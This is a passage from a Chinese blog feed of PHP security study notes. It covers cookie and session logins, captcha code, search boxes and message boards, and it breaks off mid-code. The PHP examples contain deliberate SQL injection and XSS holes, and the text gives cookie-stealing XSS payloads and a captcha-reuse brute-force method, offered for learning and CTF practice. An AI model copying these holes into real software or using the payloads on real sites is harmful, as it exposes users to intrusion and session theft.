        <content type="html"><![CDATA[<p>当看到一个登录界面的时候，我们首先要思考一下整个登录逻辑是什么样的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>客户端发送登录请求 账号 密码</span><br><span class="line"><span class="number">2.</span>服务器接受账号密码</span><br><span class="line"><span class="number">3.</span>判断账号密码的正确性</span><br><span class="line">正确 成功登录---&gt;跳转成功登录页面</span><br><span class="line">错误 登录失败---&gt;重新登录</span><br><span class="line">因为后台有很多不同的界面，所以为了方便用户，不可能每一次都进行登录，为了方便，一般会使用cookie或者session进行验证身份</span><br><span class="line">cookie:存储在客户端浏览器中，可进行cookie伪造，盗取</span><br><span class="line">session:存储在服务器中，可进行会话劫持</span><br></pre></td></tr></table></figure><h2 id="Cookie验证"><a href="#Cookie验证" class="headerlink" title="Cookie验证"></a>Cookie验证</h2><p>验证及跳转代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line"> </span><br><span class="line">    帐号：&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;</span><br><span class="line">    密码：&lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">include(&#x27;../config/conn.php&#x27;);</span><br><span class="line">$username=$_POST[&#x27;user&#x27;];</span><br><span class="line">$password=md5($_POST[&#x27;pass&#x27;]);//数据库里密码经过md5加密后存储，所以这里要用md5加密</span><br><span class="line">//echo $password;</span><br><span class="line">$sql=&quot;select * from sy_adminuser where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line">if (mysql_num_rows($result))&#123;           //mysql_num_rows判断行数</span><br><span class="line">    setcookie(&#x27;user&#x27;,$username,0,&#x27;/&#x27;);//设置cookie</span><br><span class="line">    header(&#x27;Location: index.php&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240524104621992.png" alt="image-20240524104621992"></p><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//先验证登录。才进行代码的操作</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="comment">//仅进行了是否有数据返回的判断，容易造成漏洞，无数据则回到login.php，有数据则</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: add_news.php&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;这里就是后台的文章添加页面！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功登录后，会出现如下界面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240524105302454.png" alt="image-20240524105302454"></p><p>此时f12查看时，可以看到页面已经有cookie</p><h3 id="Cookie安全问题"><a href="#Cookie安全问题" class="headerlink" title="Cookie安全问题"></a>Cookie安全问题</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/tykdtzlqh7.png" alt="img"></p><p>cookie由于存放在自己的浏览器中，如果别人利用xss漏洞获取到用户cookie就可以实现登录，在ctf中，我们经常使用xss漏洞提交<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>来实现盗取cookie</p><h2 id="Session验证"><a href="#Session验证" class="headerlink" title="Session验证"></a>Session验证</h2><p>为了解决cookie的安全性问题，提出了session验证，session验证相当于打电话，登录之后相当于接了个电话，会话结束后，session重新生成，换种方式理解，就是session的生存周期远远小于cookie，session登录一次就产生一次</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">xxxSESSIONID---&gt;是session验证</span><br><span class="line">我们仅可以考虑从会话劫持的角度进行攻击：浏览器未被关闭，此时的session是有效的，可以伪造登录</span><br></pre></td></tr></table></figure><p>session验证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line"> </span><br><span class="line">    帐号：&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;</span><br><span class="line">    密码：&lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line">include(&#x27;../config/conn.php&#x27;);</span><br><span class="line"> </span><br><span class="line">$username=$_POST[&#x27;user&#x27;];</span><br><span class="line">$password=md5($_POST[&#x27;pass&#x27;]);</span><br><span class="line">$captcha=$_POST[&#x27;captcha&#x27;];</span><br><span class="line">//echo $password;</span><br><span class="line">$sql=&quot;select * from sy_adminuser where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">echo $sql;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line">while($row=mysql_fetch_array($result))&#123; //成功登录后</span><br><span class="line">    session_start();</span><br><span class="line">    $_SESSION[&#x27;username&#x27;] = $row[&#x27;username&#x27;];//将查询结果的数据进行赋值</span><br><span class="line">    //echo $_SESSION[&#x27;username&#x27;];</span><br><span class="line">    header(&#x27;Location: index.php&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();<span class="comment">//一定要启动session，不然没有用</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;欢迎登陆管理员首页！&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;请登录后访问！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>验证码的出现是为了防止我们利用爆破工具进行重复登录，进而爆破密码；当然，在当今时代，验证码也能有效的防止DDOS攻击</p><p>下面展示<code>code.php</code>，即验证码的代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();//必须位于脚本的最顶端</span><br><span class="line">$image=imagecreatetruecolor(100, 30);//imagecreatetruecolor函数建一个真彩色图像</span><br><span class="line">//生成彩色像素</span><br><span class="line">$bgcolor=imagecolorallocate($image, 255, 255, 255);//白色背景     imagecolorallocate函数为一幅图像分配颜色</span><br><span class="line">$textcolor=imagecolorallocate($image,0,0,255);//蓝色文本</span><br><span class="line">//填充函数，xy确定坐标，color颜色执行区域填充颜色</span><br><span class="line">imagefill($image, 0, 0, $bgcolor);</span><br><span class="line">$captch_code=&quot;&quot;;//初始空值</span><br><span class="line"> </span><br><span class="line">//该循环,循环取数</span><br><span class="line">for($i=0;$i&lt;4;$i++)&#123;</span><br><span class="line">    $fontsize=6;</span><br><span class="line">    $x=($i*25)+rand(5,10);</span><br><span class="line">    $y=rand(5,10);//位置随机</span><br><span class="line">    //  $fontcontent=$i&gt;2?chr(rand(97,122)):chr(rand(65,90));//是小写，否则是大写</span><br><span class="line">    $data=&#x27;abcdefghijkmnpqrstuvwxyz3456789&#x27;;</span><br><span class="line">    $fontcontent=substr($data,rand(0,strlen($data)-1),1);</span><br><span class="line">    $fontcolor=imagecolorallocate($image,rand(0,100),rand(0,100),rand(0,100));//随机的rgb()值可以自己定</span><br><span class="line"> </span><br><span class="line">    imagestring($image,$fontsize,$x,$y,$fontcontent,$fontcolor); //水平地画一行字符串</span><br><span class="line">    $captch_code.=$fontcontent;</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[&#x27;authcode&#x27;]=$captch_code;//将变量保存再session的authcode变量中</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//该循环,循环画背景干扰的点</span><br><span class="line">for($m=0;$m&lt;=600;$m++)&#123;</span><br><span class="line"> </span><br><span class="line">    $x2=rand(1,99);</span><br><span class="line">    $y2=rand(1,99);</span><br><span class="line">    $pointcolor=imagecolorallocate($image,rand(0,255),rand(0,255),rand(0,255));</span><br><span class="line">    imagesetpixel($image,$x2,$y2,$pointcolor);// 水平地画一串像素点</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//该循环,循环画干扰直线</span><br><span class="line">for ($i=0;$i&lt;=10;$i++)&#123;</span><br><span class="line">    $x1=rand(0,99);</span><br><span class="line">    $y1=rand(0,99);</span><br><span class="line">    $x2=rand(0,99);</span><br><span class="line">    $y2=rand(0,99);</span><br><span class="line">    $linecolor=imagecolorallocate($image,rand(0,255),rand(0,255),rand(0,255));</span><br><span class="line">    imageline($image,$x1,$y1,$x2,$y2,$linecolor);//画一条线段</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">header(&#x27;content-type:image/png&#x27;);</span><br><span class="line">imagepng($image);</span><br><span class="line">//销毁</span><br><span class="line">imagedestroy($image);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>登录界面</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;!-- 简单的表单提交代码 --&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;简单验证码的实现&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; action=&quot;&quot;&gt;</span><br><span class="line">    帐号：&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;</span><br><span class="line">    密码：&lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;</span><br><span class="line">    &lt;p&gt;验证码图片:&lt;img src=&quot;code.php&quot; onClick=&quot;this.src=&#x27;code.php?nocache=&#x27;+Math.random()&quot; style=&quot;cursor:hand&quot; alt=&quot;点击换一张&quot;/&gt;点击图片可更换验证码&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;请输入图片中的内容:&lt;input type=&quot;text&quot; name=&quot;authcode&quot; value=&quot;&quot;/&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input type=&quot;submit&quot; width=&quot;20px&quot; height=19px value=&quot;提交&quot;&gt;&lt;/input&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"> </span><br><span class="line">&lt;?php</span><br><span class="line">include(&#x27;config/conn.php&#x27;);</span><br><span class="line">header(&quot;Content-type: text/html; charset=utf-8&quot;);</span><br><span class="line">// session 存值并匹配用户输入值</span><br><span class="line">if (isset($_REQUEST[&#x27;authcode&#x27;])) &#123;</span><br><span class="line">    session_start();</span><br><span class="line">    if (strtolower($_REQUEST[&#x27;authcode&#x27;])==$_SESSION[&#x27;authcode&#x27;]) &#123;//strtolower转化为小写的函数</span><br><span class="line">        echo&quot;输入正确！&quot;;</span><br><span class="line">        $username=$_POST[&#x27;user&#x27;];</span><br><span class="line">        $password=md5($_POST[&#x27;pass&#x27;]);</span><br><span class="line">        $sql=&quot;select * from sy_adminuser where username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">        $result=mysql_query($sql,$conn);</span><br><span class="line">        if(mysql_num_rows($result))&#123;</span><br><span class="line">            $row=mysql_fetch_array($result);</span><br><span class="line">            echo &#x27;成功！&#x27;;</span><br><span class="line">            session_start();</span><br><span class="line">            $_SESSION[&#x27;user&#x27;]=$row[&#x27;username&#x27;];//讲查询结果的数据进行赋值</span><br><span class="line">            header(&quot;Location: admin/add_news.php&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;失败！&#x27;;</span><br><span class="line">            //header(&quot;Location: login.php&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        # code...</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo&quot;输入错误！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240524112028819.png" alt="image-20240524112028819"></p><p>验证码验证正确之后才会进行账号密码的检查</p><h3 id="验证码安全问题"><a href="#验证码安全问题" class="headerlink" title="验证码安全问题"></a>验证码安全问题</h3><p>当验证码设置的使用周期过长时，就容易造成验证码复用的问题，即我们使用同一个验证码不断进行尝试，使用bp截取，然后改变密码进行爆破，如果验证码生成周期很长的话，就会显示验证码验证成功，进而达到绕过验证码</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> PHP开发 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP安全 </tag>
            
            <tag> Cookie </tag>
            
            <tag> Session </tag>
            
            <tag> 验证码安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发-输入输出以及UA头伪造</title>
      <link href="/post/94c1943e.html"/>
      <url>/post/94c1943e.html</url>
      
        <content type="html"><![CDATA[<h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><p>输入输出即用户通过我们设置的搜索框对我们设置的数据库进行模糊查询，但是如果设置不当或者未做好过滤处理，就容易造成sql注入和XSS攻击</p><p>搜索框代码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;search&quot;</span>&gt;</span>内容搜索:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;search&quot;</span> <span class="attr">name</span>=<span class="string">&quot;search&quot;</span> <span class="attr">id</span>=<span class="string">&quot;search&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后端进行模糊查询php代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&#x27;config/conn.php&#x27;);//引入数据库配置文件</span><br><span class="line">$s=$_POST[&#x27;search&#x27;];</span><br><span class="line">$sql=&quot;select * from sy_guestbook where gName like &#x27;%$s%&#x27;&quot;;//%是通配符的意思，中间只要有这个字符就可以，即实现模糊查询</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line">echo &#x27;你搜索的&#x27;.&quot;&#x27;$s&#x27;&quot;.&#x27;结果如下：&#x27;;</span><br><span class="line">while($row=mysql_fetch_array($result))&#123;</span><br><span class="line">    echo &#x27;&lt;br&gt;&lt;br&gt;&lt;hr&gt;&#x27;;</span><br><span class="line">    echo $row[&#x27;id&#x27;].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    echo $row[&#x27;gName&#x27;].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">    echo $row[&#x27;gLogo&#x27;].&#x27;&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>演示结果如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240524083640013.png" alt="image-20240524083640013"></p><h3 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h3><p>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击，其中XSS分为存储型、反射型、DOM型XSS</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/v2-6d3db83eec67f9c9086da0ea29ff5c3b_r.jpg" alt=""></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/v2-dba2b4a081b759d3b7f11381c8e1e829_r.jpg" alt="img"></p><p>其中，这两个的主要区别是一个永久存在于目标服务器中，另一个需要欺骗用户进行点击链接才能触发XSS代码，多用于盗取用户的Cookie信息</p><p>在这里，我们属于反射型XSS，当我们输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的时候，页面中会弹出1，当我们插入恶意js代码时，也会帮我们执行而造成安全问题，我们常用这种方式盗取管理员Cookie</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240524084710142.png" alt="image-20240524084710142"></p><p>相关CTF考点：<a href="https://blog.csdn.net/qq_56313338/article/details/125929462">BUGKU 留言板_bugku留言板-CSDN博客</a></p><p>可以参考一下这一题，对于XSS漏洞的利用体现的淋漓尽致</p><h2 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h2><p>和输入输出有一个共同点：输入的数据会在页面中显示，这也是造成XSS的第一个根本条件</p><p>留言的实现需要满足以下几个条件：</p><ul><li>加载之前的留言内容（从数据库加载）</li><li>提交留言</li><li>提交之后再次加载</li></ul><p><strong>有没有发现，如果我们将留言内容换成恶意js代码，就造成了存储型XSS</strong></p><p>我们先来看看前端代码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">留言：</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;textfield&quot;</span>&gt;</span>ID:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">id</span>=<span class="string">&quot;textfield&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;textfield2&quot;</span>&gt;</span>昵称:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;textfield2&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;textfield3&quot;</span>&gt;</span>QQ:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;qq&quot;</span> <span class="attr">id</span>=<span class="string">&quot;textfield3&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;textarea&quot;</span>&gt;</span>内容:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>留言内容：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="symbol">&amp;nbsp;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后端显示留言内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$n</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$q</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;qq&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$i</span>.<span class="variable">$n</span>.<span class="variable">$q</span>.<span class="variable">$c</span>;</span><br></pre></td></tr></table></figure><p>查看数据库原始语句</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config/conn.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$i</span>))&#123;</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;INSERT INTO `test001` VALUES (&#x27;<span class="subst">$i</span>&#x27;, &#x27;<span class="subst">$n</span>&#x27;, &#x27;<span class="subst">$q</span>&#x27;, &#x27;<span class="subst">$c</span>&#x27;);&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>,<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对留言内容进行显示</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql1</span>=<span class="string">&#x27;select * from sy_message&#x27;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql1</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;昵称：&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;QQ:&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;qq&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;内容：&#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;message&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理同上，可以参考那个CTF的考题，在此不多赘述</p><h2 id="PHP全局变量"><a href="#PHP全局变量" class="headerlink" title="PHP全局变量"></a>PHP全局变量</h2><p>全局变量可以显示IP地址，归属地，浏览器信息，访问设备等（$_SERVER专门负责接受这些信息），即我们可以通过UA头的信息进行获取相关的信息</p><p>可以参考如下文档：<a href="https://www.php.net/manual/zh/reserved.variables.server.php">PHP: $_SERVER - Manual</a></p><p>通过UA判断设备</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$referer</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line"><span class="variable">$UA</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$referer</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$UA</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240524091305101.png" alt="image-20240524091305101"></p><p>获取相关IP地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>] &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>] &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] &amp;&amp; <span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span 